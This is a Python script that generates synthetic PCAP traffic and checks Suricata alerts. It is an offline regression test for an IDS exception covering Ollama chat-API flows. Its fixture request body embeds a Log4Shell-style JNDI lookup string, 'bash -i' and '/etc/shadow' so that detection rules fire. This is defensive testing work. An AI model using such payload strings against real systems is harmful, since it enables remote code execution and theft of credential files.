#!/usr/bin/env python3
"""Generate/check offline Suricata regressions for the narrow Ollama exception.

No network operations or third-party packages are used. The addresses below are
packet-file fixtures; the generated PCAP must only be read with Suricata ``-r``.

Example, using the same installed Suricata version as the sensor:
  python3 -B validate_llm_flow_exception.py generate --output-dir /tmp/llm-fixtures
  # Make TWO test rulesets: baseline local rules + control.rules, and candidate
  # local rules + control.rules. Never add control.rules to the live ruleset.
  # Keep traffic.pcap, manifest.json and control.rules together when copying.
  # The checker verifies the PCAP and control-rule hashes beside the manifest.
  mkdir /tmp/baseline /tmp/candidate
  suricata -T -c /etc/suricata/suricata.yaml -S /tmp/candidate.rules
  suricata -c /etc/suricata/suricata.yaml --runmode single \
      --set unix-command.enabled=no --set stats.enabled=yes \
      -r /tmp/llm-fixtures/traffic.pcap -S /tmp/baseline.rules -l /tmp/baseline
  suricata -c /etc/suricata/suricata.yaml --runmode single \
      --set unix-command.enabled=no --set stats.enabled=yes \
      -r /tmp/llm-fixtures/traffic.pcap -S /tmp/candidate.rules -l /tmp/candidate
  python3 -B validate_llm_flow_exception.py check --mode baseline \
      --manifest /tmp/llm-fixtures/manifest.json --eve /tmp/baseline/eve.json
  python3 -B validate_llm_flow_exception.py check --mode candidate \
      --manifest /tmp/llm-fixtures/manifest.json --eve /tmp/candidate/eve.json

The replay commands start separate offline processes, including when run inside
the sensor's container. They never reload or signal the running sensor. Disabling
the command socket avoids a collision with that sensor; keep stats enabled when
the configuration contains EVE stats output. Create a new isolated output
directory for each replay. This tests the local rules and one synthetic control
SID, not the complete ET ruleset. Checks use flow tuple and SID presence, not
exact alert counts. Live reload/keep-alive behavior requires a separate running-
engine test; a static PCAP replay cannot validate a rule reload.
"""

import argparse
import hashlib
import ipaddress
import json
from pathlib import Path
import struct
import sys
import tempfile


TARGET_SIDS = [1000032, 1000033, 1000070, 1000071]
CONTROL_SID = 1000999
MARKER_SID = 1000000
CONTROL_TEXT = "SOC_AUDIT_MARKER"
CONTROL_RULE = (
    'alert tcp any any -> any any (msg:"OFFLINE ONLY SOC exception control"; '
    'flow:established; content:"SOC_AUDIT_MARKER"; sid:1000999; rev:1;)\n'
)
A_IP = "192.168.16.230"
DGX_IP = "211.170.162.110"
ATTACK_BODY = json.dumps({
    "model": "offline-fixture",
    "messages": [{"role": "user", "content": (
        "Inert audit quotation: ${jndi:ldap://example.invalid/a}; "
        "bash -i; /etc/shadow; " + CONTROL_TEXT
    )}],
}, separators=(",", ":")).encode("ascii")
REPLY_TEXT = b"Quoted documentation only: bash -i; /etc/shadow.\n"
SSE_TEXT = b'data: {"text":"Quoted bash -i and /etc/shadow"}\n\ndata: [DONE]\n\n'
BENIGN_BODY = b'{"messages":[{"role":"user","content":"Hello"}]}'


def checksum(data):
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def packet(src, sport, dst, dport, seq, ack, flags, payload, ident):
    """Ethernet + IPv4 + TCP, including correct IP and pseudo-header checksums."""
    src_ip = ipaddress.IPv4Address(src).packed
    dst_ip = ipaddress.IPv4Address(dst).packed
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags,
                      64240, 0, 0)
    pseudo = src_ip + dst_ip + struct.pack("!BBH", 0, 6, len(tcp) + len(payload))
    tcp_sum = checksum(pseudo + tcp + payload)
    tcp = tcp[:16] + struct.pack("!H", tcp_sum) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp) + len(payload),
                     ident % 65536, 0x4000, 64, 6, 0, src_ip, dst_ip)
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    # Locally administered fictional MACs. Direction does not affect TCP state.
    ethernet = bytes.fromhex("0200000000020200000000010800")
    return ethernet + ip + tcp + payload


class Capture:
    def __init__(self):
        self.packets = []

    def append(self, *args):
        self.packets.append(packet(*args, ident=len(self.packets) + 1))

    def bytes(self):
        result = bytearray(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0,
                                       65535, 1))
        # Fixed fixture time; reproducible bytes without exposing live traffic.
        for index, raw in enumerate(self.packets):
            total_us = index * 10000
            sec, usec = divmod(total_us, 1000000)
            result.extend(struct.pack("<IIII", 1791802800 + sec, usec,
                                      len(raw), len(raw)))
            result.extend(raw)
        return bytes(result)


class Connection:
    def __init__(self, capture, client, server, sport, dport):
        self.capture = capture
        self.client, self.server = client, server
        self.sport, self.dport = sport, dport
        self.cseq, self.sseq = 100000 + sport, 800000 + sport
        self.emit(True, 0x02, ack=0)  # SYN
        self.cseq += 1
        self.emit(False, 0x12)       # SYN/ACK
        self.sseq += 1
        self.emit(True, 0x10)        # ACK

    def emit(self, from_client, flags, payload=b"", ack=None):
        if from_client:
            args = (self.client, self.sport, self.server, self.dport,
                    self.cseq, self.sseq if ack is None else ack, flags, payload)
        else:
            args = (self.server, self.dport, self.client, self.sport,
                    self.sseq, self.cseq if ack is None else ack, flags, payload)
        self.capture.append(*args)

    def send(self, from_client, chunks):
        for chunk in chunks:
            if not chunk:
                continue
            self.emit(from_client, 0x18, chunk)
            if from_client:
                self.cseq += len(chunk)
            else:
                self.sseq += len(chunk)
            self.emit(not from_client, 0x10)

    def close(self):
        self.emit(True, 0x11)
        self.cseq += 1
        self.emit(False, 0x10)
        self.emit(False, 0x11)
        self.sseq += 1
        self.emit(True, 0x10)


def request(body):
    header = (
        "POST /v1/chat/completions HTTP/1.1\r\n"
        "Host: ollama.fixture.invalid\r\n"
        "User-Agent: offline-soc-regression\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n" % len(body)
    ).encode("ascii")
    return header + body


def response(body, sse=False):
    header = (
        "HTTP/1.1 200 OK\r\nContent-Type: %s\r\n"
        "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n" %
        ("text/event-stream" if sse else "text/plain", len(body))
    ).encode("ascii")
    return header + body


def split_inside(data, needle, offset):
    pos = data.index(needle) + offset
    return [data[:pos], data[pos:]]


def build_capture():
    capture, cases = Capture(), []
    definitions = [
        ("ollama_single", A_IP, DGX_IP, 11434, "single", True),
        ("ollama_split_body", A_IP, DGX_IP, 11434, "split", True),
        ("ollama_keepalive", A_IP, DGX_IP, 11434, "keepalive", True),
        ("ollama_sse_reply", A_IP, DGX_IP, 11434, "sse", True),
        ("same_dgx_other_port", A_IP, DGX_IP, 8080, "single", False),
        ("other_client_to_dgx", "192.168.16.231", DGX_IP, 11434, "single", False),
        ("dgx_initiated_to_a", DGX_IP, A_IP, 8080, "single", False),
        ("attacker_to_a", "192.168.16.50", A_IP, 8080, "single", False),
        ("attacker_to_c", "192.168.16.50", "10.200.10.20", 8080, "single", False),
        ("other_dgx_not_allowed", A_IP, "211.170.162.111", 11434, "single", False),
        ("benign_ollama", A_IP, DGX_IP, 11434, "benign", True),
        ("benign_web", "192.168.16.50", A_IP, 8080, "benign", False),
    ]
    for index, (name, client, server, dport, style, exempt) in enumerate(definitions):
        sport = 41000 + index
        conn = Connection(capture, client, server, sport, dport)
        benign = style == "benign"
        if style == "keepalive":
            conn.send(True, [request(BENIGN_BODY)])
            conn.send(False, [response(b"Hello\n")])
        req = request(BENIGN_BODY if benign else ATTACK_BODY)
        # Split both the application header/body boundary and a JNDI marker.
        if style == "split":
            boundary = req.index(b"\r\n\r\n") + 4
            body_chunks = split_inside(req[boundary:], b"${jndi:", 4)
            chunks = [req[:boundary], *body_chunks]
        else:
            chunks = [req]
        conn.send(True, chunks)
        reply = response(b"Hello\n" if benign else (SSE_TEXT if style == "sse" else REPLY_TEXT),
                         sse=style == "sse")
        conn.send(False, split_inside(reply, b"bash -i", 5) if style == "sse" else [reply])
        conn.close()
        normal_required = [] if benign else TARGET_SIDS + [CONTROL_SID]
        candidate_required = [] if benign else ([CONTROL_SID] if exempt else normal_required)
        cases.append({
            "id": name, "client_ip": client, "client_port": sport,
            "server_ip": server, "server_port": dport, "style": style,
            "exception_scope": exempt,
            "baseline": {"required_sids": normal_required,
                         "forbidden_sids": [MARKER_SID], "no_alerts": benign,
                         "required_response_sids": [] if benign else [1000070, 1000071]},
            "candidate": {"required_sids": candidate_required,
                          "forbidden_sids": [MARKER_SID] + (TARGET_SIDS if exempt else []),
                          "no_alerts": benign,
                          "required_response_sids": [] if benign or exempt else [1000070, 1000071]},
        })
    raw = capture.bytes()
    manifest = {
        "schema_version": 1, "purpose": "offline local-rule Ollama flow exception regression",
        "pcap": {"path": "traffic.pcap", "sha256": hashlib.sha256(raw).hexdigest(),
                 "packets": len(capture.packets)},
        "control_rules": {"path": "control.rules", "sid": CONTROL_SID,
                          "sha256": hashlib.sha256(CONTROL_RULE.encode()).hexdigest()},
        "candidate_exception_sids": TARGET_SIDS, "cases": cases,
    }
    return raw, manifest


def generate(output_dir):
    output_dir = Path(output_dir)
    if output_dir.exists():
        raise ValueError("output directory already exists; choose a new directory")
    raw, manifest = build_capture()
    output_dir.mkdir(parents=True)
    (output_dir / "traffic.pcap").write_bytes(raw)
    (output_dir / "control.rules").write_text(CONTROL_RULE, encoding="utf-8")
    (output_dir / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return {"generated": str(output_dir), "cases": len(manifest["cases"]),
            "packets": manifest["pcap"]["packets"], "pcap_sha256": manifest["pcap"]["sha256"]}


def tuple_key(case, response_direction=False):
    client = (case["client_ip"], int(case["client_port"]))
    server = (case["server_ip"], int(case["server_port"]))
    return (*server, *client) if response_direction else (*client, *server)


def check(manifest_path, eve_path, mode):
    manifest_path, eve_path = Path(manifest_path), Path(eve_path)
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    if manifest.get("schema_version") != 1:
        raise ValueError("unsupported manifest schema")
    # Tie checks to the generator's exact artifacts and expected policy.
    generated_raw, expected = build_capture()
    if manifest != expected:
        raise ValueError("manifest differs from this validator's deterministic fixture")
    pcap_path = manifest_path.parent / manifest["pcap"]["path"]
    if hashlib.sha256(pcap_path.read_bytes()).hexdigest() != manifest["pcap"]["sha256"]:
        raise ValueError("fixture PCAP checksum mismatch")
    rule_path = manifest_path.parent / manifest["control_rules"]["path"]
    if hashlib.sha256(rule_path.read_bytes()).hexdigest() != manifest["control_rules"]["sha256"]:
        raise ValueError("fixture control rule checksum mismatch")
    del generated_raw
    lookup, seen = {}, {}
    for case in manifest["cases"]:
        seen[case["id"]] = {"request": {}, "response": {}}
        for is_response in (False, True):
            key = tuple_key(case, is_response)
            if key in lookup:
                raise ValueError("duplicate fixture tuple")
            lookup[key] = (case["id"], "response" if is_response else "request")
    unexpected = 0
    with eve_path.open(encoding="utf-8") as source:
        for lineno, line in enumerate(source, 1):
            if not line.strip():
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError as exc:
                raise ValueError("invalid EVE JSON at line %d" % lineno) from exc
            if not isinstance(event, dict):
                raise ValueError("EVE event must be an object at line %d" % lineno)
            if event.get("event_type") != "alert":
                continue
            try:
                key = (event["src_ip"], int(event["src_port"]),
                       event["dest_ip"], int(event["dest_port"]))
                sid = int(event["alert"]["signature_id"])
            except (KeyError, TypeError, ValueError) as exc:
                raise ValueError("missing alert tuple/SID at EVE line %d" % lineno) from exc
            match = lookup.get(key)
            if not match:
                unexpected += 1
                continue
            case_id, direction = match
            counts = seen[case_id][direction]
            counts[sid] = counts.get(sid, 0) + 1
    failures, results = [], []
    for case in manifest["cases"]:
        observations, policy = seen[case["id"]], case[mode]
        actual = set(observations["request"]) | set(observations["response"])
        missing = sorted(set(policy["required_sids"]) - actual)
        forbidden = sorted(set(policy["forbidden_sids"]) & actual)
        missing_response = sorted(set(policy["required_response_sids"]) - set(observations["response"]))
        benign_violation = bool(policy["no_alerts"] and actual)
        ok = not (missing or forbidden or missing_response or benign_violation)
        result = {"case": case["id"], "pass": ok,
                  "observed_request_sids": sorted(observations["request"]),
                  "observed_response_sids": sorted(observations["response"]),
                  "missing_sids": missing, "forbidden_sids_seen": forbidden,
                  "missing_response_sids": missing_response, "benign_alert": benign_violation}
        results.append(result)
        if not ok:
            failures.append(case["id"])
    if unexpected:
        failures.append("unexpected_alert_flows")
    return {"mode": mode, "pass": not failures, "failures": failures,
            "unexpected_alert_count": unexpected, "cases": results,
            "pcap_sha256": manifest["pcap"]["sha256"],
            "eve_sha256": hashlib.sha256(eve_path.read_bytes()).hexdigest()}


def selftest():
    raw, manifest = build_capture()
    assert raw == build_capture()[0]
    assert len(manifest["cases"]) == 12
    cursor, packets = 24, 0
    while cursor < len(raw):
        _, _, caplen, wirelen = struct.unpack_from("<IIII", raw, cursor)
        assert caplen == wirelen
        data = raw[cursor + 16:cursor + 16 + caplen]
        ip, tcp = data[14:34], data[34:]
        assert checksum(ip) == 0
        pseudo = ip[12:20] + struct.pack("!BBH", 0, 6, len(tcp))
        assert checksum(pseudo + tcp) == 0
        cursor += 16 + caplen
        packets += 1
    assert cursor == len(raw) and packets == manifest["pcap"]["packets"]
    with tempfile.TemporaryDirectory(prefix="soc-pcap-selftest-") as temp:
        fixture = Path(temp) / "fixtures"
        generate(fixture)
        for mode in ("baseline", "candidate"):
            events = []
            for case in manifest["cases"]:
                for response_direction, field in ((False, "required_sids"),
                                                   (True, "required_response_sids")):
                    src, sport, dst, dport = tuple_key(case, response_direction)
                    for sid in case[mode][field]:
                        events.append({"event_type": "alert", "src_ip": src, "src_port": sport,
                                       "dest_ip": dst, "dest_port": dport,
                                       "alert": {"signature_id": sid}})
            eve = Path(temp) / (mode + ".jsonl")
            eve.write_text("".join(json.dumps(e) + "\n" for e in events))
            assert check(fixture / "manifest.json", eve, mode)["pass"]
            if mode == "candidate":
                contaminated = dict(events[0])
                contaminated["alert"] = {"signature_id": 1000032}
                with eve.open("a") as output:
                    output.write(json.dumps(contaminated) + "\n")
                assert not check(fixture / "manifest.json", eve, mode)["pass"]
        empty = Path(temp) / "empty.jsonl"
        empty.write_text("")
        assert not check(fixture / "manifest.json", empty, "candidate")["pass"]
    return {"selftest": "PASS", "checks": ["deterministic capture", "IPv4/TCP checksums",
            "baseline/candidate expected presence", "forbidden SID rejected", "empty EVE rejected"],
            "cases": len(manifest["cases"]), "packets": packets,
            "suricata_replay": "not performed by selftest"}


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="command", required=True)
    gen = sub.add_parser("generate", help="write synthetic PCAP, control rule and manifest")
    gen.add_argument("--output-dir", required=True)
    check_parser = sub.add_parser("check", help="check offline EVE SID observations by connection")
    check_parser.add_argument("--manifest", required=True)
    check_parser.add_argument("--eve", required=True)
    check_parser.add_argument("--mode", required=True, choices=["baseline", "candidate"])
    check_parser.add_argument("--report", help="optional new JSON report path (never overwrite)")
    sub.add_parser("selftest", help="stdlib-only checks; does not invoke Suricata")
    args = parser.parse_args(argv)
    try:
        if args.command == "generate":
            result = generate(args.output_dir)
        elif args.command == "selftest":
            result = selftest()
        else:
            result = check(args.manifest, args.eve, args.mode)
            if args.report:
                with Path(args.report).open("x", encoding="utf-8") as report:
                    report.write(json.dumps(result, ensure_ascii=False, indent=2) + "\n")
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 1 if result.get("pass") is False else 0
    except (OSError, ValueError, AssertionError) as exc:
        print("ERROR: %s" % exc, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
